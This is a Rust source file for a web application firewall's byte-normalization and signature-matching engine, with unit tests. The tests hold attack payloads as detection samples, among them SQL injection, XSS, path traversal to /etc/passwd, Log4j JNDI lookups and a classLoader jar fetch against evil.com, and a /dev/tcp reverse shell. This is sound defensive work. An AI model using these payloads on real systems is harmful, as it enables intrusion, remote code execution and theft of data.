//! Zero-Regex Fast Byte Scanning and Anti-Evasion Normalization Engine for `waf_lite`.
//!
//! Provides in-place percent-decoding (up to 3 nested passes), case-folding,
//! whitespace/comment collapsing (including SQL inline comments `/* ... */`,
//! single-line `-- ...\n` and `# ...\n`), and SIMD multi-pattern matching against known
//! L7 attack signatures directly on byte slices (`&[u8]`) with ZERO heap allocations.

use std::collections::HashSet;

use aho_corasick::{AhoCorasick, MatchKind};

pub use super::dictionary::{
    BUILTIN_ATTACK_SIGNATURES, BUILTIN_MALICIOUS_USER_AGENTS, ThreatVector,
};
use crate::error::PluginError;

/// High-performance SIMD multi-pattern Aho-Corasick matching engine for WAF Lite.
#[derive(Clone, Debug)]
pub struct WafMatcher {
    pattern_ac: AhoCorasick,
    pattern_meta: Vec<ThreatVector>,
    ua_ac: AhoCorasick,
}

impl WafMatcher {
    /// Compiles built-in attack signatures, custom patterns, and user-agents into SIMD-accelerated automata.
    /// Automatically deduplicates custom patterns against built-in signatures and internal repeats.
    pub fn new(custom_patterns: &[String], custom_uas: &[String]) -> Result<Self, PluginError> {
        let total_pat_cap = BUILTIN_ATTACK_SIGNATURES.len() + custom_patterns.len();
        let mut seen_patterns = HashSet::with_capacity(total_pat_cap);
        let mut patterns: Vec<&str> = Vec::with_capacity(total_pat_cap);
        let mut meta = Vec::with_capacity(total_pat_cap);

        for &(pat, vector) in BUILTIN_ATTACK_SIGNATURES {
            seen_patterns.insert(pat);
            patterns.push(pat);
            meta.push(vector);
        }

        let mut normalized_custom_pats: Vec<String> = Vec::with_capacity(custom_patterns.len());
        for pat in custom_patterns {
            let lower = pat.trim().to_ascii_lowercase();
            if !lower.is_empty()
                && !BUILTIN_ATTACK_SIGNATURES
                    .iter()
                    .any(|&(b, _)| lower.contains(b))
            {
                normalized_custom_pats.push(lower);
            }
        }
        for pat in &normalized_custom_pats {
            if seen_patterns.insert(pat.as_str()) {
                patterns.push(pat.as_str());
                meta.push(ThreatVector::CustomPattern);
            }
        }

        let pattern_ac = AhoCorasick::builder()
            .match_kind(MatchKind::Standard)
            .build(&patterns)
            .map_err(|e| {
                PluginError::Config(format!("Failed to compile WAF pattern automaton: {e}"))
            })?;

        let total_ua_cap = BUILTIN_MALICIOUS_USER_AGENTS.len() + custom_uas.len();
        let mut seen_uas = HashSet::with_capacity(total_ua_cap);
        let mut uas: Vec<&str> = Vec::with_capacity(total_ua_cap);

        for &ua in BUILTIN_MALICIOUS_USER_AGENTS {
            seen_uas.insert(ua);
            uas.push(ua);
        }

        let mut normalized_custom_uas: Vec<String> = Vec::with_capacity(custom_uas.len());
        for ua in custom_uas {
            let lower = ua.trim().to_ascii_lowercase();
            if !lower.is_empty()
                && !BUILTIN_MALICIOUS_USER_AGENTS
                    .iter()
                    .any(|&b| lower.contains(b))
            {
                normalized_custom_uas.push(lower);
            }
        }
        for ua in &normalized_custom_uas {
            if seen_uas.insert(ua.as_str()) {
                uas.push(ua.as_str());
            }
        }

        let ua_ac = AhoCorasick::builder()
            .match_kind(MatchKind::Standard)
            .build(&uas)
            .map_err(|e| {
                PluginError::Config(format!("Failed to compile WAF User-Agent automaton: {e}"))
            })?;

        Ok(Self {
            pattern_ac,
            pattern_meta: meta,
            ua_ac,
        })
    }

    /// Direct single-pass SIMD lookup on an already-normalized slice.
    #[inline(always)]
    fn match_slice(&self, slice: &[u8]) -> Option<ThreatVector> {
        self.pattern_ac
            .find(slice)
            .map(|m| self.pattern_meta[m.pattern().as_usize()])
    }

    /// Evaluates raw input bytes against all configured attack signatures with anti-evasion normalization.
    ///
    /// Executes in two defensive stages when comment/whitespace markers are present:
    /// - **Stage A**: Scans percent-decoded, lowercased bytes *before* SQL comment stripping so
    ///   attackers cannot hide XSS (`/*<script>*/`), Log4j (`/*${jndi:...}*/`), or RCE (`/*;whoami*/`) inside SQL comments.
    /// - **Stage B**: Strips SQL inline/line comments (`/**/`, `--...\n`, `#...\n`) and collapses whitespace
    ///   in-place to catch comment-fragmented SQLi (`UNION/**/SELECT`, `UNION--\nSELECT`).
    #[inline]
    pub fn check_patterns(&self, bytes: &[u8], convert_plus: bool) -> Option<ThreatVector> {
        if !needs_normalization(bytes, convert_plus) {
            return self.match_slice(bytes);
        }

        if bytes.len() <= 1024 {
            let mut stack_buf = [0u8; 1024];
            let (decoded_len, has_compaction_markers) =
                decode_percent_multi_pass(bytes, convert_plus, &mut stack_buf);
            if let Some(vector) = self.match_slice(&stack_buf[..decoded_len]) {
                return Some(vector);
            }
            if has_compaction_markers {
                let compact_len = compact_whitespace_and_comments(&mut stack_buf, decoded_len);
                return self.match_slice(&stack_buf[..compact_len]);
            }
            None
        } else {
            let mut heap_buf = vec![0u8; bytes.len()];
            let (decoded_len, has_compaction_markers) =
                decode_percent_multi_pass(bytes, convert_plus, &mut heap_buf);
            if let Some(vector) = self.match_slice(&heap_buf[..decoded_len]) {
                return Some(vector);
            }
            if has_compaction_markers {
                let compact_len = compact_whitespace_and_comments(&mut heap_buf, decoded_len);
                return self.match_slice(&heap_buf[..compact_len]);
            }
            None
        }
    }

    /// Evaluates raw User-Agent header bytes against known malicious scanners.
    /// Performs zero-allocation percent-decoding and lowercasing without stripping `#` or `/*` tokens.
    #[inline]
    pub fn check_user_agent(&self, bytes: &[u8]) -> bool {
        if !bytes.iter().any(|&b| b == b'%' || b.is_ascii_uppercase()) {
            return self.ua_ac.find(bytes).is_some();
        }

        if bytes.len() <= 1024 {
            let mut stack_buf = [0u8; 1024];
            let (decoded_len, _) = decode_percent_multi_pass(bytes, false, &mut stack_buf);
            self.ua_ac.find(&stack_buf[..decoded_len]).is_some()
        } else {
            let mut heap_buf = vec![0u8; bytes.len()];
            let (decoded_len, _) = decode_percent_multi_pass(bytes, false, &mut heap_buf);
            self.ua_ac.find(&heap_buf[..decoded_len]).is_some()
        }
    }
}

/// Converts a hex ASCII character to its 4-bit numeric value.
#[inline(always)]
fn hex_val(b: u8) -> Option<u8> {
    match b {
        b'0'..=b'9' => Some(b - b'0'),
        b'a'..=b'f' => Some(b - b'a' + 10),
        b'A'..=b'F' => Some(b - b'A' + 10),
        _ => None,
    }
}

/// Performs up to 3 passes of percent-decoding, ASCII lowercasing, and optional `+` to space conversion.
/// Returns `(decoded_len, has_compaction_markers)` where `has_compaction_markers` indicates whether
/// whitespace folding or SQL comment stripping is needed.
#[inline]
fn decode_percent_multi_pass(input: &[u8], convert_plus: bool, out: &mut [u8]) -> (usize, bool) {
    let mut i = 0;
    let mut o = 0;
    let mut produced_percent = false;
    let mut has_compaction_markers = false;
    let mut prev_space = false;

    while i < input.len() && o < out.len() {
        let mut b = input[i];
        if b == b'%' && i + 2 < input.len() {
            if let (Some(v1), Some(v2)) = (hex_val(input[i + 1]), hex_val(input[i + 2])) {
                let decoded = (v1 << 4) | v2;
                if decoded == b'%' {
                    produced_percent = true;
                }
                b = decoded.to_ascii_lowercase();
                if convert_plus && b == b'+' {
                    b = b' ';
                }
                i += 3;
            } else {
                b = b.to_ascii_lowercase();
                i += 1;
            }
        } else {
            b = b.to_ascii_lowercase();
            if convert_plus && b == b'+' {
                b = b' ';
            }
            i += 1;
        }

        if matches!(b, b'\t' | b'\r' | b'\n' | b'#')
            || (b == b' ' && prev_space)
            || (o > 0 && ((out[o - 1] == b'/' && b == b'*') || (out[o - 1] == b'-' && b == b'-')))
        {
            has_compaction_markers = true;
        }
        prev_space = b == b' ';
        out[o] = b;
        o += 1;
    }

    let mut len = o;
    let mut passes = 1;
    while produced_percent && passes < 3 {
        // Multi-pass in-place decode: read index i is always >= write index o
        let mut r = 0;
        let mut w = 0;
        produced_percent = false;
        prev_space = false;
        while r < len {
            let mut b = out[r];
            if b == b'%' && r + 2 < len {
                if let (Some(v1), Some(v2)) = (hex_val(out[r + 1]), hex_val(out[r + 2])) {
                    let decoded = (v1 << 4) | v2;
                    if decoded == b'%' {
                        produced_percent = true;
                    }
                    b = decoded.to_ascii_lowercase();
                    if convert_plus && b == b'+' {
                        b = b' ';
                    }
                    r += 3;
                } else {
                    r += 1;
                }
            } else {
                if convert_plus && b == b'+' {
                    b = b' ';
                }
                r += 1;
            }

            if matches!(b, b'\t' | b'\r' | b'\n' | b'#')
                || (b == b' ' && prev_space)
                || (w > 0
                    && ((out[w - 1] == b'/' && b == b'*') || (out[w - 1] == b'-' && b == b'-')))
            {
                has_compaction_markers = true;
            }
            prev_space = b == b' ';
            out[w] = b;
            w += 1;
        }
        len = w;
        passes += 1;
    }

    (len, has_compaction_markers)
}

/// In-place whitespace folding and SQL comment collapsing (`/* ... */`, `-- ...[\r\n]`, `# ...[\r\n]`).
///
/// Security invariants:
/// 1. Comments never cross `&` (query parameter delimiter), `<` (HTML tag), or `$` (expression lookup),
///    preventing cross-parameter comment smuggling (`?a=/*&id=union+select&b=*/`).
/// 2. Single-line comments (`--` and `#`) only fold when terminated by `\n` or `\r`, preventing
///    unterminated `-- ` from truncating the remainder of the query string.
#[inline]
fn compact_whitespace_and_comments(buf: &mut [u8], len: usize) -> usize {
    let mut r = 0;
    let mut w = 0;
    let mut last_was_space = false;

    while r < len {
        // 1. Detect bounded SQL inline comment: /* ... */ (except MySQL /*! versioned execution)
        if buf[r] == b'/'
            && r + 1 < len
            && buf[r + 1] == b'*'
            && (r + 2 >= len || buf[r + 2] != b'!')
        {
            let mut end = r + 2;
            let mut found = false;
            while end + 1 < len {
                if matches!(buf[end], b'&' | b'<' | b'$') {
                    break;
                }
                if buf[end] == b'*' && buf[end + 1] == b'/' {
                    found = true;
                    break;
                }
                end += 1;
            }
            if found {
                r = end + 2;
                if !last_was_space {
                    buf[w] = b' ';
                    w += 1;
                    last_was_space = true;
                }
                continue;
            }
        }

        // 2. Detect SQL single-line comment: -- followed by [\r\n] within same parameter
        if buf[r] == b'-' && r + 1 < len && buf[r + 1] == b'-' {
            let mut end = r + 2;
            let mut has_newline = false;
            while end < len {
                if matches!(buf[end], b'&' | b'<' | b'$') {
                    break;
                }
                if matches!(buf[end], b'\n' | b'\r') {
                    has_newline = true;
                    break;
                }
                end += 1;
            }
            if has_newline {
                r = end + 1;
                while r < len && matches!(buf[r], b'\n' | b'\r') {
                    r += 1;
                }
                if !last_was_space {
                    buf[w] = b' ';
                    w += 1;
                    last_was_space = true;
                }
                continue;
            }
        }

        // 3. Detect SQL single-line comment: # followed by [\r\n] within same parameter
        if buf[r] == b'#' {
            let mut end = r + 1;
            let mut has_newline = false;
            while end < len {
                if matches!(buf[end], b'&' | b'<' | b'$') {
                    break;
                }
                if matches!(buf[end], b'\n' | b'\r') {
                    has_newline = true;
                    break;
                }
                end += 1;
            }
            if has_newline {
                r = end + 1;
                while r < len && matches!(buf[r], b'\n' | b'\r') {
                    r += 1;
                }
                if !last_was_space {
                    buf[w] = b' ';
                    w += 1;
                    last_was_space = true;
                }
                continue;
            }
        }

        let b = buf[r];
        if b == b' ' || b == b'\t' || b == b'\r' || b == b'\n' {
            if !last_was_space {
                buf[w] = b' ';
                w += 1;
                last_was_space = true;
            }
        } else {
            buf[w] = b;
            w += 1;
            last_was_space = false;
        }
        r += 1;
    }

    w
}

/// Fast-path inspector checking whether input bytes require any normalization.
#[inline(always)]
fn needs_normalization(bytes: &[u8], convert_plus: bool) -> bool {
    let mut prev_space = false;
    let mut i = 0;
    while i < bytes.len() {
        let b = bytes[i];
        if b == b'%' || b.is_ascii_uppercase() {
            return true;
        }
        if convert_plus && b == b'+' {
            return true;
        }
        if b == b'/' && i + 1 < bytes.len() && bytes[i + 1] == b'*' {
            return true;
        }
        if b == b'-' && i + 1 < bytes.len() && bytes[i + 1] == b'-' {
            return true;
        }
        if b == b'#' || b == b'\t' || b == b'\r' || b == b'\n' {
            return true;
        }
        if b == b' ' {
            if prev_space {
                return true;
            }
            prev_space = true;
        } else {
            prev_space = false;
        }
        i += 1;
    }
    false
}

/// Full canonical normalization into `out` buffer (used for whitebox unit testing).
#[cfg(test)]
fn normalize_bytes_into(bytes: &[u8], convert_plus: bool, out: &mut [u8]) -> usize {
    let (len, has_compaction_markers) = decode_percent_multi_pass(bytes, convert_plus, out);
    if has_compaction_markers {
        compact_whitespace_and_comments(out, len)
    } else {
        len
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_percent_decode_and_case_folding() {
        let input = b"%2e%2e%2fetc%2fPasswd";
        let mut buf = [0u8; 128];
        let len = normalize_bytes_into(input, false, &mut buf);
        assert_eq!(&buf[..len], b"../etc/passwd");
    }

    #[test]
    fn test_double_and_triple_percent_decoding_anti_evasion() {
        // %252e%252e%252f -> %2e%2e%2f -> ../
        let input_double = b"%252e%252e%252fetc%2fpasswd";
        let mut buf = [0u8; 128];
        let len = normalize_bytes_into(input_double, false, &mut buf);
        assert_eq!(&buf[..len], b"../etc/passwd");

        // %25252e%25252e%25252f -> ../
        let input_triple = b"%25252e%25252e%25252fetc%2fpasswd";
        let len3 = normalize_bytes_into(input_triple, false, &mut buf);
        assert_eq!(&buf[..len3], b"../etc/passwd");
    }

    #[test]
    fn test_form_urlencoded_plus_to_space_conversion() {
        let input = b"1%27+UNION+SELECT+*";
        let mut buf = [0u8; 128];
        let len = normalize_bytes_into(input, true, &mut buf);
        assert_eq!(&buf[..len], b"1' union select *");
    }

    #[test]
    fn test_whitespace_and_inline_comment_collapsing() {
        let input = b"UNION/**/SELECT\t\t*\r\nFROM";
        let mut buf = [0u8; 128];
        let len = normalize_bytes_into(input, false, &mut buf);
        assert_eq!(&buf[..len], b"union select * from");
    }

    #[test]
    fn test_single_line_sql_comments_collapsing() {
        // -- comment followed by \n or \r
        let input1 = b"UNION--%0aSELECT 1";
        let mut buf = [0u8; 128];
        let len1 = normalize_bytes_into(input1, false, &mut buf);
        assert_eq!(&buf[..len1], b"union select 1");

        let input1_cr = b"UNION--comment%0dSELECT 1";
        let len1_cr = normalize_bytes_into(input1_cr, false, &mut buf);
        assert_eq!(&buf[..len1_cr], b"union select 1");

        // # comment followed by \n or \r
        let input2 = b"UNION#%0aSELECT 1";
        let len2 = normalize_bytes_into(input2, false, &mut buf);
        assert_eq!(&buf[..len2], b"union select 1");

        let input2_cr = b"UNION#comment%0dSELECT 1";
        let len2_cr = normalize_bytes_into(input2_cr, false, &mut buf);
        assert_eq!(&buf[..len2_cr], b"union select 1");

        // Legitimate double-dash in URL should NOT be stripped
        let input3 = b"/blog/my-post--part-2";
        let len3 = normalize_bytes_into(input3, false, &mut buf);
        assert_eq!(&buf[..len3], b"/blog/my-post--part-2");
    }

    #[test]
    fn test_prevents_comment_wrapping_and_parameter_smuggling_bypasses() {
        let matcher = WafMatcher::new(&[], &[]).unwrap();

        // 1. Prepending `-- ` in an earlier parameter must NEVER truncate subsequent query parameters
        let sqli_after_dash = b"a=--%20&id=1%27+UNION+SELECT+password+FROM+users";
        assert_eq!(
            matcher.check_patterns(sqli_after_dash, true),
            Some(ThreatVector::SqlInjection)
        );

        // 2. Cross-parameter `/* ... */` smuggling must NEVER hide middle parameters
        let sqli_across_params = b"a=/*&id=1%27+UNION+SELECT+1&b=*/";
        assert_eq!(
            matcher.check_patterns(sqli_across_params, true),
            Some(ThreatVector::SqlInjection)
        );

        // 3. Wrapping XSS `<script>` inside `/* ... */` must still be caught in Stage A
        let xss_in_comment = b"q=/*<script>alert(1)</script>*/";
        assert_eq!(
            matcher.check_patterns(xss_in_comment, true),
            Some(ThreatVector::CrossSiteScripting)
        );

        // 4. Wrapping Log4j `${jndi:...}` inside `/* ... */` must still be caught in Stage A
        let log4j_in_comment = b"/* ${jndi:ldap://evil.com/a} */";
        assert_eq!(
            matcher.check_patterns(log4j_in_comment, false),
            Some(ThreatVector::RemoteCodeExecution)
        );

        // 5. Wrapping RCE `;whoami` inside `/* ... */` must still be caught in Stage A
        let rce_in_comment = b"/* ;whoami */";
        assert_eq!(
            matcher.check_patterns(rce_in_comment, false),
            Some(ThreatVector::RemoteCodeExecution)
        );

        // 6. Wrapping scanner User-Agent inside `/* ... */` must still be caught
        assert!(matcher.check_user_agent(b"/* sqlmap/1.6 */"));
    }

    #[test]
    fn test_no_false_positives_on_common_query_parameters_and_matrix_uris() {
        let matcher = WafMatcher::new(&[], &[]).unwrap();

        // Query parameters starting with `sh` (`&shipping=`, `&shop_id=`, `&share=`, `&show=`)
        assert_eq!(
            matcher.check_patterns(
                b"page=1&shipping=express&shop_id=42&share=true&show=1",
                true
            ),
            None
        );

        // REST matrix parameter `;id=`
        assert_eq!(
            matcher.check_patterns(b"/api/v1/users;id=12345/profile", false),
            None
        );
    }

    #[test]
    fn test_matcher_detects_path_traversal_and_cves() {
        let matcher = WafMatcher::new(&[], &[]).unwrap();

        // Standard traversal
        let input1 = b"/download?file=%252e%252e%252fetc/passwd";
        assert_eq!(
            matcher.check_patterns(input1, true),
            Some(ThreatVector::PathTraversal)
        );

        // Tomcat CVE-2018-1305 traversal
        let input2 = b"/app/..;/..;/etc/shadow";
        assert_eq!(
            matcher.check_patterns(input2, false),
            Some(ThreatVector::PathTraversal)
        );

        // Sensitive file probe
        let input3 = b"/.env";
        assert_eq!(
            matcher.check_patterns(input3, false),
            Some(ThreatVector::PathTraversal)
        );
    }

    #[test]
    fn test_matcher_detects_parenthesis_and_blind_sqli() {
        let matcher = WafMatcher::new(&[], &[]).unwrap();

        // SQLi without spaces using parenthesis
        let input1 = b"id=1'UNION(SELECT password FROM users)";
        assert_eq!(
            matcher.check_patterns(input1, true),
            Some(ThreatVector::SqlInjection)
        );

        // Time-based blind SQLi (waitfor delay)
        let input2 = b"id=1';WAITFOR DELAY '0:0:5'--";
        assert_eq!(
            matcher.check_patterns(input2, true),
            Some(ThreatVector::SqlInjection)
        );

        // MySQL & PostgreSQL sleep
        let input3 = b"id=1' AND pg_sleep(5)-- ";
        assert_eq!(
            matcher.check_patterns(input3, true),
            Some(ThreatVector::SqlInjection)
        );

        // MySQL versioned comment execution
        let input4 = b"id=1' /*!50000UNION*/ SELECT 1";
        assert_eq!(
            matcher.check_patterns(input4, true),
            Some(ThreatVector::SqlInjection)
        );

        // DB-level RCE
        let input5 = b"'; EXEC xp_cmdshell('dir')--";
        assert_eq!(
            matcher.check_patterns(input5, true),
            Some(ThreatVector::SqlInjection)
        );
    }

    #[test]
    fn test_matcher_detects_rce_and_cves() {
        let matcher = WafMatcher::new(&[], &[]).unwrap();

        assert_eq!(
            matcher.check_patterns(b";whoami", false),
            Some(ThreatVector::RemoteCodeExecution)
        );
        assert_eq!(
            matcher.check_patterns(b"|/bin/sh", false),
            Some(ThreatVector::RemoteCodeExecution)
        );
        assert_eq!(
            matcher.check_patterns(b"&&bash", false),
            Some(ThreatVector::RemoteCodeExecution)
        );
        assert_eq!(
            matcher.check_patterns(b"`id`", false),
            Some(ThreatVector::RemoteCodeExecution)
        );
        assert_eq!(
            matcher.check_patterns(b";cat$IFS/etc/passwd", false),
            Some(ThreatVector::RemoteCodeExecution)
        );
        assert_eq!(
            matcher.check_patterns(b"${${lower:j}ndi:ldap://evil.com/a}", false),
            Some(ThreatVector::RemoteCodeExecution)
        );
        assert_eq!(
            matcher.check_patterns(b"${env:NaN:-j}ndi:ldap://evil.com/a", false),
            Some(ThreatVector::RemoteCodeExecution)
        );
        assert_eq!(
            matcher.check_patterns(
                b"class.module.classLoader.URLs[0]=jar:http://evil.com/x.war!/",
                false
            ),
            Some(ThreatVector::RemoteCodeExecution)
        );
        assert_eq!(
            matcher.check_patterns(b"/bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1", false),
            Some(ThreatVector::RemoteCodeExecution)
        );
    }

    #[test]
    fn test_matcher_detects_malicious_user_agent() {
        let matcher = WafMatcher::new(&[], &["badbot".to_string()]).unwrap();

        assert!(matcher.check_user_agent(b"sqlmap/1.6#stable"));
        assert!(matcher.check_user_agent(b"Mozilla/5.0 (BadBot/1.0)"));
        assert!(matcher.check_user_agent(b"Metasploit HTTP Client"));
        assert!(!matcher.check_user_agent(b"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"));
    }

    #[test]
    fn test_deduplication_in_matcher() {
        let custom_patterns = vec![
            "../".to_string(),
            "pg_sleep(".to_string(),
            "CUSTOM_ATTACK".to_string(),
            "CUSTOM_ATTACK".to_string(),
        ];
        let custom_uas = vec![
            "sqlmap".to_string(),
            "custom_bot".to_string(),
            "custom_bot".to_string(),
        ];
        let matcher = WafMatcher::new(&custom_patterns, &custom_uas).unwrap();

        assert_eq!(
            matcher.check_patterns(b"/test?q=custom_attack", false),
            Some(ThreatVector::CustomPattern)
        );
    }
}
